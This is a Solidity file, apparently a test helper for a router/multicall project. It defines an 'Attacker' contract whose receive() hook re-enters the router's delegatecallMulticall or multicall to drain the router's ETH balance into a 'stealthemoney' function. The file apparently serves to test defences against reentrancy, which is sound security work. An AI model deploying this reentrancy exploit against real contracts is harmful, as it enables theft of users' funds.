pragma solidity ^0.8.23;
import {IERC20Router} from "../../src/v1/interfaces/IERC20Router.sol";
import {Call3Value, Result} from "../../src/v2/utils/RelayStructs.sol";

interface iM {
    function delegatecallMulticall(
        address[] calldata targets,
        bytes[] calldata datas,
        uint256[] calldata values,
        address refundTo
    ) external payable returns (bytes memory);

    function multicall(
        Call3Value[] calldata calls,
        address refundTo,
        address nftRecipient
    ) external payable returns (Result[] memory returnData);

    function aggregate(
        address[] calldata targets,
        bytes[] calldata data,
        uint256[] calldata values,
        address refundTo
    ) external payable returns (bytes[] memory);

    function setApprovalForAll(address operator, bool approved) external;
}

contract Attacker {
    address public target;
    bool reentrant;
    bool callV1;
    bool callV2;

    constructor(
        address _target,
        bool _callV1,
        bool _callV2
    ) {
        target = _target;
        callV1 = _callV1;
        callV2 = _callV2;
    }

    receive() external payable {
        if (reentrant == false) {
            //we will call Multicaller via ERC20Router
            reentrant = true;

            //balance of extra money in ERC20Router we want to steal
            uint256 erc20router_balance = target.balance;

            address[] memory targets = new address[](1);
            targets[0] = address(this);

            bytes[] memory datas = new bytes[](1);
            datas[0] = abi.encodeWithSignature("stealthemoney()");

            uint256[] memory values = new uint256[](1);
            values[0] = erc20router_balance;

            if (callV1) {
                //call ERC20Router and steal it!
                iM(target).delegatecallMulticall(
                    targets,
                    datas,
                    values,
                    address(this)
                );
            } else if (callV2) {
                Call3Value[] memory calls = new Call3Value[](1);
                calls[0] = Call3Value({
                    target: address(this),
                    allowFailure: false,
                    value: erc20router_balance,
                    callData: abi.encodeWithSignature("stealthemoney()")
                });

                iM(target).multicall(calls, address(this), address(this));
            }
        }
    }

    function stealthemoney() external payable {}
}
